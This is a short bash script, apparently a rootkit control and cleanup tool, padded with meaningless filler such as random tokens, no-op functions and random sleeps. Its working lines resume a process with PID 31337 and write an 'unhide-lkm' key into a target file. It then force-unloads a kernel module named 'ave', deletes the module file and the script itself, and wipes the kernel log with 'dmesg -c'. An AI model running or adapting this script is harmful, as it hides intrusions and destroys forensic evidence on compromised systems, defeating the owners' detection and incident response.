#!/bin/bash
set -euo pipefail

INIT_SEED="init_$(date +%s%N)"
STRING_LOWERCASE="$(echo "RONE" | tr 'A-Z' 'a-z')"

SESSION_TOKEN=$(echo "$RANDOM" | md5sum | cut -d ' ' -f1)
CALC_FACTOR=$(( (RANDOM % 50) * 3 ))
LOG_TAG="log_$(date +%s%N)"

placeholder_action() {
  local _value="$1"
  printf "%s" "$_value" > /dev/null
}

delay_briefly() {
  local _pause
  _pause=$(awk -v min=0.03 -v max=0.2 'BEGIN{srand(); print min + rand() * (max - min)}')
  sleep "$_pause" 2>/dev/null || true
}

TARGET_FILE="$1"
SECRET_KEY="$2"
placeholder_action "$SESSION_TOKEN"

sleep 30
delay_briefly

kill -CONT 31337
echo "unhide-lkm=$SECRET_KEY" > "$TARGET_FILE"
placeholder_action "$CALC_FACTOR"
sudo rmmod -f ave
sudo rm -f ave.ko "$0"

sudo dmesg -c
placeholder_action "$LOG_TAG"
delay_briefly
